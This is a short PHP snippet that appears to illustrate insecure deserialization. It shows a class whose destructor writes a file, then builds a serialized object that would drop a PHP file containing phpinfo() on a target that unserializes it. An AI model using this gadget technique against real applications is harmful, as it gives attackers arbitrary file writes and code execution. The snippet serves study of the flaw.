Original vulnerable function:
```
<?php


class Foo{
    function __construct($filename, $data) {
        $this->filename = $filename . ".txt";
        $this->data = $data;
    }
    function __destruct(){
        file_put_contents($this->filename, $this->data);
    }
}
?>
```


Edited:

```
<?php
class Foo{
    function __construct($filename, $data) {
        $this->filename = $filename;
        $this->data = $data;
    }
    function __destruct(){
        file_put_contents($this->filename, $this->data);
    }
}
# initialise $a as Foo class, which will be constructed with args 1 and 2. as per the original function these will be set as properties within the object
$a = new Foo("test.php","<?php phpinfo(); ?>");
echo serialize($a);
?>
```
